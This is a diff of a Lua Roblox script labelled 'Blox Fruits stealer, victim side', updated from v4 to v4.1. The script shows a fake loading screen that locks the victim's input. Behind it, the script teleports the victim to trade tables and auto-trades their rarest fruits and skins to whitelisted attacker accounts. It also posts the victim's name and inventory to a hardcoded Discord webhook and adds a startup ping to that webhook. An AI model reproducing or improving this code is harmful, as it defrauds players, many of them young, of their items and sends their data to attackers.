@@ -1,22 +1,9 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v4
--- Sections:
---   1. CONFIG
---   2. SERVICES + STATE
---   3. LOADER (spawns immediately)
---   4. INPUT LOCK
---   5. PLACE GUARD (console-only)
---   6. REMOTE WAIT
---   7. HTTP
---   8. INVENTORY + PRIORITY
---   9. EMBED
---  10. CHARACTER / MAP / ZONE WAITS
---  11. SEATS
---  12. ANTI-CHEAT-SAFE TELEPORT
---  13. SIT
---  14. TRADE
---  15. CHAT COMMANDS
---  16. MAIN LOOP
+-- BLOX FRUITS STEALER — VICTIM SIDE v4.1
+-- Fixes:
+--   1. Whitelist case-insensitive + self-kick guard + 2s confirm before hop
+--   2. Sit stability: no re-sit while hum.Sit is true, cooldown on failure
+--   3. Webhook: boot ping at startup, logs every attempt + status
 -- =============================================================================
 
 -- =============================================================================
@@ -24,36 +11,29 @@
 -- =============================================================================
 local S2, S3 = 4442272183, 7449423635
 local KNOWN_PLACES = {
-    [2753915549]     = true,  -- Sea 1
-    [4442272183]     = true,  -- Sea 2
-    [7449423635]     = true,  -- Sea 3
-    [95165932064349] = true,  -- alt/unknown documented id
+    [2753915549]     = true,
+    [4442272183]     = true,
+    [7449423635]     = true,
+    [95165932064349] = true,
 }
 
 local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
-    ["blueno_op1"] = true,
+    ["mythicalop123456"] = true,
 }
 
-local LOADER_SECONDS       = 180
-local MAX_ITEMS_PER_TRADE  = 4
-local KICK_THRESHOLD       = 5
-local KICK_MSG             = "RUN AFTER TRADE 5/5 RESETS!"
-local CHAT_PREFIX          = "."
+local LOADER_SECONDS      = 180
+local MAX_ITEMS_PER_TRADE = 4
+local KICK_THRESHOLD      = 5
+local KICK_MSG            = "RUN AFTER TRADE 5/5 RESETS!"
+local CHAT_PREFIX         = "."
+local HOP_CONFIRM_TIME    = 2.0   -- seconds non-whitelisted must stay before kicking
+local SIT_COOLDOWN        = 1.5   -- seconds between sit attempts
 
--- Fruit priority (lower index = grabbed first)
-local FRUIT_PRIORITY = {
-    "dragonwest",
-    "dragoneast",
-    "kitsune",
-    "magnet",
-    "control",
-    "venom",
-}
+local FRUIT_PRIORITY = { "dragonwest", "dragoneast", "kitsune", "magnet", "control", "venom" }
 
--- Skin / perm priority (ranked after fruits)
 local SKIN_PRIORITY = {
     "rabid", "vibes", "galaxy", "doghouse", "ember",
     "redlightning", "divine", "arcsteel", "celestial",
@@ -73,10 +53,14 @@ local HttpService  = game:GetService("HttpService")
 local LP           = Players.LocalPlayer
 local PG           = LP:WaitForChild("PlayerGui")
 
-local CommF         = nil
-local TradeFunction = nil
+local CommF          = nil
+local TradeFunction  = nil
 local tradesCompleted = 0
-local lastTpAt = 0
+local lastTpAt        = 0
+local lastSitTime     = 0
+local lastSitAttempt  = 0
+local oppositeSeen    = {}   -- [userId] = tick when first seen opposite
+local webhookAlive    = nil  -- set by boot ping
 
 local function log(msg)
     pcall(function() print("[stealer] " .. tostring(msg)) end)
@@ -85,7 +69,24 @@ end
 log("boot | game=" .. tostring(game.Name) .. " | placeId=" .. tostring(game.PlaceId))
 
 -- =============================================================================
--- 3. LOADER — spawned immediately as first action
+-- 3. WHITELIST HELPER — case-insensitive
+-- =============================================================================
+local function cleanName(s)
+    return tostring(s or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
+end
+
+local WHITELIST_LC = {}
+for name in pairs(WHITELIST) do
+    WHITELIST_LC[cleanName(name)] = true
+end
+
+local function isWhitelisted(player)
+    if not player then return false end
+    return WHITELIST_LC[cleanName(player.Name)] == true
+end
+
+-- =============================================================================
+-- 4. LOADER
 -- =============================================================================
 local function showLoadingScreen()
     if not game:IsLoaded() then
@@ -100,7 +101,6 @@ local function showLoadingScreen()
     sg.Modal = true
     sg.Parent = PG
 
-    -- input absorber
     local blocker = Instance.new("TextButton")
     blocker.Size = UDim2.new(1, 0, 1, 0)
     blocker.BackgroundTransparency = 1
@@ -172,120 +172,120 @@ local function showLoadingScreen()
     panelStroke.Thickness = 1.5
     panelStroke.Transparency = 0.3
 
-    local watermarkLabel = Instance.new("TextLabel")
-    watermarkLabel.Size = UDim2.new(0.5, 0, 0, 20)
-    watermarkLabel.Position = UDim2.new(0, 12, 0, 8)
-    watermarkLabel.BackgroundTransparency = 1
-    watermarkLabel.Text = "Made by Màrk L."
-    watermarkLabel.Font = Enum.Font.GothamMedium
-    watermarkLabel.TextSize = 10
-    watermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    watermarkLabel.TextXAlignment = Enum.TextXAlignment.Left
-    watermarkLabel.TextTransparency = 0.65
-    watermarkLabel.ZIndex = 6
-    watermarkLabel.Parent = centerPanel
+    local wm = Instance.new("TextLabel")
+    wm.Size = UDim2.new(0.5, 0, 0, 20)
+    wm.Position = UDim2.new(0, 12, 0, 8)
+    wm.BackgroundTransparency = 1
+    wm.Text = "Made by Màrk L."
+    wm.Font = Enum.Font.GothamMedium
+    wm.TextSize = 10
+    wm.TextColor3 = Color3.fromRGB(255, 255, 255)
+    wm.TextXAlignment = Enum.TextXAlignment.Left
+    wm.TextTransparency = 0.65
+    wm.ZIndex = 6
+    wm.Parent = centerPanel
 
-    local profileCircle = Instance.new("Frame")
-    profileCircle.Size = UDim2.new(0, 75, 0, 75)
-    profileCircle.Position = UDim2.new(0.5, 0, 0.28, 0)
-    profileCircle.AnchorPoint = Vector2.new(0.5, 0.5)
-    profileCircle.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
-    profileCircle.BorderSizePixel = 0
-    profileCircle.ZIndex = 6
-    profileCircle.Parent = centerPanel
-    Instance.new("UICorner", profileCircle).CornerRadius = UDim.new(1, 0)
-    local circleStroke = Instance.new("UIStroke", profileCircle)
-    circleStroke.Color = Color3.fromRGB(0, 255, 170)
-    circleStroke.Thickness = 2
+    local circ = Instance.new("Frame")
+    circ.Size = UDim2.new(0, 75, 0, 75)
+    circ.Position = UDim2.new(0.5, 0, 0.28, 0)
+    circ.AnchorPoint = Vector2.new(0.5, 0.5)
+    circ.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+    circ.BorderSizePixel = 0
+    circ.ZIndex = 6
+    circ.Parent = centerPanel
+    Instance.new("UICorner", circ).CornerRadius = UDim.new(1, 0)
+    local cs = Instance.new("UIStroke", circ)
+    cs.Color = Color3.fromRGB(0, 255, 170)
+    cs.Thickness = 2
 
-    local avatarImage = Instance.new("ImageLabel")
-    avatarImage.Size = UDim2.new(0.92, 0, 0.92, 0)
-    avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
-    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
-    avatarImage.BackgroundTransparency = 1
-    avatarImage.ZIndex = 6
-    avatarImage.Parent = profileCircle
-    Instance.new("UICorner", avatarImage).CornerRadius = UDim.new(1, 0)
+    local av = Instance.new("ImageLabel")
+    av.Size = UDim2.new(0.92, 0, 0.92, 0)
+    av.Position = UDim2.new(0.5, 0, 0.5, 0)
+    av.AnchorPoint = Vector2.new(0.5, 0.5)
+    av.BackgroundTransparency = 1
+    av.ZIndex = 6
+    av.Parent = circ
+    Instance.new("UICorner", av).CornerRadius = UDim.new(1, 0)
     pcall(function()
-        avatarImage.Image = Players:GetUserThumbnailAsync(LP.UserId,
+        av.Image = Players:GetUserThumbnailAsync(LP.UserId,
             Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
     end)
 
-    local infoLabel = Instance.new("TextLabel")
-    infoLabel.Size = UDim2.new(0.88, 0, 0, 35)
-    infoLabel.Position = UDim2.new(0.5, 0, 0.54, 0)
-    infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    infoLabel.BackgroundTransparency = 1
-    infoLabel.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
-    infoLabel.Font = Enum.Font.GothamBlack
-    infoLabel.TextSize = 11
-    infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
-    infoLabel.TextWrapped = true
-    infoLabel.ZIndex = 6
-    infoLabel.Parent = centerPanel
-    local infoStroke = Instance.new("UIStroke", infoLabel)
-    infoStroke.Color = Color3.fromRGB(0, 0, 0)
-    infoStroke.Thickness = 1.5
+    local info = Instance.new("TextLabel")
+    info.Size = UDim2.new(0.88, 0, 0, 35)
+    info.Position = UDim2.new(0.5, 0, 0.54, 0)
+    info.AnchorPoint = Vector2.new(0.5, 0.5)
+    info.BackgroundTransparency = 1
+    info.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
+    info.Font = Enum.Font.GothamBlack
+    info.TextSize = 11
+    info.TextColor3 = Color3.fromRGB(255, 215, 0)
+    info.TextWrapped = true
+    info.ZIndex = 6
+    info.Parent = centerPanel
+    local ist = Instance.new("UIStroke", info)
+    ist.Color = Color3.fromRGB(0, 0, 0)
+    ist.Thickness = 1.5
 
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, 0, 0, 20)
-    statusLabel.Position = UDim2.new(0, 0, 0.63, 0)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "Initializing environmental pipeline..."
-    statusLabel.Font = Enum.Font.GothamMedium
-    statusLabel.TextSize = 9.5
-    statusLabel.TextColor3 = Color3.fromRGB(150, 155, 170)
-    statusLabel.ZIndex = 6
-    statusLabel.Parent = centerPanel
+    local st = Instance.new("TextLabel")
+    st.Size = UDim2.new(1, 0, 0, 20)
+    st.Position = UDim2.new(0, 0, 0.63, 0)
+    st.BackgroundTransparency = 1
+    st.Text = "Initializing environmental pipeline..."
+    st.Font = Enum.Font.GothamMedium
+    st.TextSize = 9.5
+    st.TextColor3 = Color3.fromRGB(150, 155, 170)
+    st.ZIndex = 6
+    st.Parent = centerPanel
 
-    local percentLabel = Instance.new("TextLabel")
-    percentLabel.Size = UDim2.new(1, 0, 0, 20)
-    percentLabel.Position = UDim2.new(0, 0, 0.79, 0)
-    percentLabel.BackgroundTransparency = 1
-    percentLabel.Text = "0%"
-    percentLabel.Font = Enum.Font.Code
-    percentLabel.TextSize = 13
-    percentLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
-    percentLabel.ZIndex = 6
-    percentLabel.Parent = centerPanel
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(1, 0, 0, 20)
+    pct.Position = UDim2.new(0, 0, 0.79, 0)
+    pct.BackgroundTransparency = 1
+    pct.Text = "0%"
+    pct.Font = Enum.Font.Code
+    pct.TextSize = 13
+    pct.TextColor3 = Color3.fromRGB(0, 255, 170)
+    pct.ZIndex = 6
+    pct.Parent = centerPanel
 
-    local barTrack = Instance.new("Frame")
-    barTrack.Size = UDim2.new(0.85, 0, 0, 4)
-    barTrack.Position = UDim2.new(0.075, 0, 0.70, 0)
-    barTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
-    barTrack.BorderSizePixel = 0
-    barTrack.ZIndex = 6
-    barTrack.Parent = centerPanel
-    Instance.new("UICorner", barTrack).CornerRadius = UDim.new(1, 0)
+    local track = Instance.new("Frame")
+    track.Size = UDim2.new(0.85, 0, 0, 4)
+    track.Position = UDim2.new(0.075, 0, 0.70, 0)
+    track.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
+    track.BorderSizePixel = 0
+    track.ZIndex = 6
+    track.Parent = centerPanel
+    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
 
-    local barFill = Instance.new("Frame")
-    barFill.Size = UDim2.new(0, 0, 1, 0)
-    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-    barFill.BorderSizePixel = 0
-    barFill.ZIndex = 6
-    barFill.Parent = barTrack
-    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
-    Instance.new("UIGradient", barFill).Color = ColorSequence.new({
+    local fill = Instance.new("Frame")
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+    fill.BorderSizePixel = 0
+    fill.ZIndex = 6
+    fill.Parent = track
+    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
+    Instance.new("UIGradient", fill).Color = ColorSequence.new({
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170)),
     })
 
-    local discordLabel = Instance.new("TextLabel")
-    discordLabel.Size = UDim2.new(1, 0, 0, 15)
-    discordLabel.Position = UDim2.new(0.5, 0, 0.94, 0)
-    discordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-    discordLabel.BackgroundTransparency = 1
-    discordLabel.Text = "Join https://discord.gg/mozil"
-    discordLabel.Font = Enum.Font.Code
-    discordLabel.TextSize = 10.5
-    discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
-    discordLabel.ZIndex = 6
-    discordLabel.Parent = centerPanel
+    local dc = Instance.new("TextLabel")
+    dc.Size = UDim2.new(1, 0, 0, 15)
+    dc.Position = UDim2.new(0.5, 0, 0.94, 0)
+    dc.AnchorPoint = Vector2.new(0.5, 0.5)
+    dc.BackgroundTransparency = 1
+    dc.Text = "Join https://discord.gg/mozil"
+    dc.Font = Enum.Font.Code
+    dc.TextSize = 10.5
+    dc.TextColor3 = Color3.fromRGB(0, 170, 255)
+    dc.ZIndex = 6
+    dc.Parent = centerPanel
 
-    local loopConnection = RunService.Heartbeat:Connect(function()
+    local loopConn = RunService.Heartbeat:Connect(function()
         if math.random() < 0.04 then spawnParticle() end
         local pulse = (math.sin(tick() * 4) + 1) / 2
-        circleStroke.Transparency = 0.1 + (pulse * 0.4)
+        cs.Transparency = 0.1 + (pulse * 0.4)
         panelStroke.Transparency = 0.2 + (pulse * 0.3)
     end)
 
@@ -306,47 +306,40 @@ local function showLoadingScreen()
         local elapsed = os.time() - t0
         local progress = math.clamp(elapsed / LOADER_SECONDS, 0, 1)
         local percent = math.floor(progress * 100)
-
         if percent >= 98 then
-            TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad),
+            TweenService:Create(fill, TweenInfo.new(0.3, Enum.EasingStyle.Quad),
                 { Size = UDim2.new(0.98, 0, 1, 0) }):Play()
-            percentLabel.Text = "98%"
+            pct.Text = "98%"
             break
         end
-
-        TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Linear),
+        TweenService:Create(fill, TweenInfo.new(0.5, Enum.EasingStyle.Linear),
             { Size = UDim2.new(progress, 0, 1, 0) }):Play()
-        percentLabel.Text = percent .. "%"
-
-        if percent < 20 then statusLabel.Text = phrases[1]
-        elseif percent < 45 then statusLabel.Text = phrases[2]
-        elseif percent < 70 then statusLabel.Text = phrases[3]
-        elseif percent < 90 then statusLabel.Text = phrases[4]
-        else statusLabel.Text = phrases[5] end
-
+        pct.Text = percent .. "%"
+        if percent < 20 then st.Text = phrases[1]
+        elseif percent < 45 then st.Text = phrases[2]
+        elseif percent < 70 then st.Text = phrases[3]
+        elseif percent < 90 then st.Text = phrases[4]
+        else st.Text = phrases[5] end
         task.wait(0.4)
     end
-
     task.wait(2)
-    TweenService:Create(barFill, TweenInfo.new(0.3), { Size = UDim2.new(1, 0, 1, 0) }):Play()
-    percentLabel.Text = "100%"
+    TweenService:Create(fill, TweenInfo.new(0.3), { Size = UDim2.new(1, 0, 1, 0) }):Play()
+    pct.Text = "100%"
     task.wait(0.6)
-
-    loopConnection:Disconnect()
+    loopConn:Disconnect()
     if blur.Parent then blur:Destroy() end
     if touchGui then touchGui.Enabled = true end
     if sg.Parent then sg:Destroy() end
-    log("loader closed")
 end
 
--- SPAWN LOADER FIRST
 task.spawn(function()
     local ok, err = pcall(showLoadingScreen)
     if not ok then log("loader error: " .. tostring(err)) end
 end)
+log("loader spawned")
 
 -- =============================================================================
--- 4. PLACE GUARD — console-only, never blocks
+-- 5. PLACE GUARD — console-only
 -- =============================================================================
 do
     local ok = KNOWN_PLACES[game.PlaceId]
@@ -354,16 +347,12 @@ do
         local n = tostring(game.Name):lower()
         if n:find("blox", 1, true) or n:find("fruit", 1, true) then ok = true end
     end
-    if ok then
-        log("place OK | placeId=" .. tostring(game.PlaceId) .. " | name=" .. tostring(game.Name))
-    else
-        log("place NOT recognised | placeId=" .. tostring(game.PlaceId) ..
-            " | name=" .. tostring(game.Name) .. " — continuing anyway")
-    end
+    log("place " .. (ok and "OK" or "NOT recognised") .. " | " ..
+        tostring(game.PlaceId) .. " | " .. tostring(game.Name))
 end
 
 -- =============================================================================
--- 5. REMOTE WAIT
+-- 6. REMOTE WAIT
 -- =============================================================================
 local function waitChild(parent, name, timeout)
     local t0 = tick()
@@ -381,48 +370,74 @@ if RemotesFolder then
     TradeFunction = waitChild(RemotesFolder, "TradeFunction", 30)
 end
 
-if CommF then log("CommF_ OK") else log("WARN: CommF_ missing — inventory will fail") end
-if TradeFunction then log("TradeFunction OK") else log("WARN: TradeFunction missing — trade will fail") end
+log("CommF_" .. (CommF and " OK" or " MISSING"))
+log("TradeFunction" .. (TradeFunction and " OK" or " MISSING"))
 
 -- =============================================================================
--- 6. HTTP
+-- 7. HTTP + WEBHOOK
 -- =============================================================================
 local function getHttpFn()
-    if syn and syn.request then return syn.request end
-    if request then return request end
-    if http_request then return http_request end
-    if fluxus and fluxus.request then return fluxus.request end
-    if http and http.request then return http.request end
-    return nil
+    if syn and syn.request then return syn.request, "syn.request" end
+    if request then return request, "request" end
+    if http_request then return http_request, "http_request" end
+    if fluxus and fluxus.request then return fluxus.request, "fluxus.request" end
+    if http and http.request then return http.request, "http.request" end
+    return nil, "none"
 end
 
-local function postEmbed(embed)
-    local fn = getHttpFn()
-    if not fn then log("no http fn — webhook skipped") return end
+local function postEmbed(embed, label)
+    label = label or "embed"
+    local fn, fnName = getHttpFn()
+    if not fn then
+        log("WEBHOOK SKIP: no http fn available")
+        return false
+    end
     local okBody, body = pcall(function()
         return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } })
     end)
-    if not okBody then log("json encode failed") return end
-
+    if not okBody then
+        log("WEBHOOK FAIL: JSON encode: " .. tostring(body))
+        return false
+    end
     local ok, res = pcall(fn, {
         Url = WEBHOOK, Method = "POST",
         Headers = { ["Content-Type"] = "application/json" },
         Body = body,
     })
-    if not ok then log("http failed: " .. tostring(res)) return end
-    if res and res.StatusCode and res.StatusCode >= 400 then
-        log("http status " .. res.StatusCode)
-    else
-        log("webhook ok")
+    if not ok then
+        log("WEBHOOK FAIL (" .. fnName .. "): " .. tostring(res))
+        return false
     end
+    if res and res.StatusCode then
+        if res.StatusCode >= 400 then
+            log("WEBHOOK FAIL (" .. fnName .. ") " .. res.StatusCode ..
+                ": " .. tostring(res.Body):sub(1, 150))
+            return false
+        else
+            log("WEBHOOK OK (" .. fnName .. ") status=" .. res.StatusCode .. " | " .. label)
+            return true
+        end
+    end
+    log("WEBHOOK OK (" .. fnName .. ") | " .. label)
+    return true
 end
 
+-- boot ping
+task.spawn(function()
+    task.wait(6)
+    webhookAlive = postEmbed({
+        title = "stealer online",
+        description = string.format("Victim: %s\nGame: %s\nPlaceId: %d",
+            LP.Name, tostring(game.Name), game.PlaceId),
+        color = 0x00AAFF,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }, "boot ping")
+end)
+
 -- =============================================================================
--- 7. INVENTORY + PRIORITY
+-- 8. INVENTORY + PRIORITY
 -- =============================================================================
-local function norm(s)
-    return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "")
-end
+local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
 
 local function getInventory()
     if not CommF then return nil end
@@ -471,24 +486,20 @@ local function collectTradeable()
     return out
 end
 
--- =============================================================================
--- 8. EMBED
--- =============================================================================
 local function sendInventoryEmbed(reason)
-    local inv = getInventory() or {}
+    local inv = getInventory()
+    if not inv then log("embed: inventory nil") return end
     local ordered = {}
     for _, item in ipairs(inv) do
         if isFruit(item) or isPremium(item) then ordered[#ordered + 1] = item end
     end
     table.sort(ordered, function(a, b) return priorityRank(a) < priorityRank(b) end)
-
     local lines = {}
     for i, item in ipairs(ordered) do
         lines[#lines + 1] = string.format("#%02d  %s (x%d)",
             i, tostring(item.Name):gsub("-", " "), item.Count or 1)
     end
     if #lines == 0 then lines = { "None" } end
-
     postEmbed({
         title = "🍇 Blox Fruits — Victim on chair",
         description = reason or "Whitelisted trade started.",
@@ -500,11 +511,11 @@ local function sendInventoryEmbed(reason)
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         footer = { text = "ofx in the corner" },
-    })
+    }, "trade start")
 end
 
 -- =============================================================================
--- 9. CHARACTER / MAP / ZONE WAITS
+-- 9. WAITS
 -- =============================================================================
 local function waitForChar(timeout)
     if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then return LP.Character end
@@ -582,7 +593,9 @@ local function currentSeat()
 end
 
 local function oppositeSeat(seat, tbl)
-    return seat == tbl.P1 and tbl.P2 or tbl.P1
+    if seat == tbl.P1 then return tbl.P2 end
+    if seat == tbl.P2 then return tbl.P1 end
+    return nil
 end
 
 local function pickSeat(exclude)
@@ -590,8 +603,8 @@ local function pickSeat(exclude)
     for _, tbl in ipairs(tables) do
         if tbl ~= exclude then
             local o1, o2 = seatOccupant(tbl.P1), seatOccupant(tbl.P2)
-            if not o1 and (not o2 or WHITELIST[o2.Name]) then return tbl.P1 end
-            if not o2 and (not o1 or WHITELIST[o1.Name]) then return tbl.P2 end
+            if not o1 and (not o2 or isWhitelisted(o2)) then return tbl.P1 end
+            if not o2 and (not o1 or isWhitelisted(o1)) then return tbl.P2 end
         end
     end
     for _, tbl in ipairs(tables) do
@@ -604,7 +617,7 @@ local function pickSeat(exclude)
 end
 
 -- =============================================================================
--- 11. ANTI-CHEAT-SAFE TELEPORT
+-- 11. SAFE TELEPORT
 -- =============================================================================
 local function safeTeleport(targetVec)
     local now = tick()
@@ -662,15 +675,30 @@ local function safeTeleport(targetVec)
 end
 
 -- =============================================================================
--- 12. SIT
+-- 12. SIT — stable, no re-sit while sitting
 -- =============================================================================
 local function sitOn(seat)
     if not seat then return false end
-    if currentSeat() == seat then return true end
+
+    -- already sitting on target?
+    if currentSeat() == seat then
+        lastSitTime = tick()
+        return true
+    end
+
+    -- already sitting somewhere? (hum.Sit true but currentSeat nil — weld forming)
+    local char = LP.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum and hum.Sit and tick() - lastSitTime < 2.5 then
+            -- sitting but weld not detected yet; don't teleport/re-sit
+            return false
+        end
+    end
 
     if not safeTeleport(seat.Position + Vector3.new(0, 3, 0)) then return false end
 
-    local char = waitForChar(5)
+    char = waitForChar(5)
     if not char then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
@@ -692,7 +720,10 @@ local function sitOn(seat)
     end
     conn:Disconnect()
 
-    if welded then log("sat: " .. seat:GetFullName()) end
+    if welded then
+        lastSitTime = tick()
+        log("sat: " .. seat:GetFullName())
+    end
     return welded
 end
 
@@ -736,10 +767,10 @@ end
 
 local function runAutoTrade(reason)
     local items = collectTradeable()
-    log("trade: " .. #items .. " tradeable")
+    log("trade: " .. #items .. " tradeable | " .. reason)
+    sendInventoryEmbed(reason)
     if #items == 0 then return end
 
-    sendInventoryEmbed(reason)
     clearTradeItems()
     task.wait(0.25)
 
@@ -855,21 +886,53 @@ task.spawn(function()
 
         while true do
             task.wait(0.5)
+
             local curSeat, tbl = currentSeat()
             if not curSeat then
-                local target = pickSeat(nil)
-                if target then sitOn(target) end
+                -- confirm we really aren't sitting
+                local char = LP.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                local isSitting = hum and hum.Sit
+
+                if isSitting and tick() - lastSitTime < 3 then
+                    -- sitting but weld not detected; don't re-tp
+                    task.wait(0.2)
+                elseif tick() - lastSitAttempt >= SIT_COOLDOWN then
+                    lastSitAttempt = tick()
+                    local target = pickSeat(nil)
+                    if target then
+                        local ok2 = sitOn(target)
+                        if not ok2 then task.wait(1.0) end
+                    end
+                end
             else
                 local opp = seatOccupant(oppositeSeat(curSeat, tbl))
-                if opp and WHITELIST[opp.Name] then
+
+                if opp == LP then opp = nil end  -- self-guard
+
+                if opp and isWhitelisted(opp) then
+                    oppositeSeen[opp.UserId] = nil
                     if tradeWindowOpen() then
-                        runAutoTrade("whitelisted opposite: " .. opp.Name)
+                        runAutoTrade("whitelisted: " .. opp.Name)
                     end
-                elseif opp and not WHITELIST[opp.Name] then
-                    log("non-whitelisted opposite: " .. opp.Name .. " — hopping")
-                    forceJumpOff()
-                    local target = pickSeat(tbl)
-                    if target then sitOn(target) end
+                elseif opp and not isWhitelisted(opp) then
+                    -- confirm they stay for HOP_CONFIRM_TIME before kicking
+                    local key = opp.UserId
+                    if not oppositeSeen[key] then
+                        oppositeSeen[key] = tick()
+                        log("opp=" .. opp.Name .. " (not whitelisted, confirming...)")
+                    elseif tick() - oppositeSeen[key] >= HOP_CONFIRM_TIME then
+                        log("confirm non-whitelisted: " .. opp.Name .. " — hopping")
+                        oppositeSeen[key] = nil
+                        forceJumpOff()
+                        local target = pickSeat(tbl)
+                        if target then sitOn(target) end
+                    end
+                else
+                    -- opp nil, clear stale entries
+                    for k, t in pairs(oppositeSeen) do
+                        if tick() - t > 5 then oppositeSeen[k] = nil end
+                    end
                 end
             end
         end
